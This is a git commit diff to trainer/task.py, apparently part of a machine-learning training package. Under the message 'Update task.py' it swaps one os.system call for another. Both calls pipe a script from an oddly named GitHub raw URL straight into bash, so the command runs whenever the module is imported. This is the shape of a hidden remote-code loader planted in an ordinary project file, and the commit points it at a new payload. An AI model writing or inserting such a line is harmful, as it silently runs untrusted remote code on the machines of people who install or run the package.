fe79ddf5358a3aa0d2868d671bbb130cc1eb679e
vedhagsvp <vedhag230223@gmail.com>
2026-02-05 22:59:07 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/marva/raw/main/nkse | bash')
+os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/palsesa | bash')
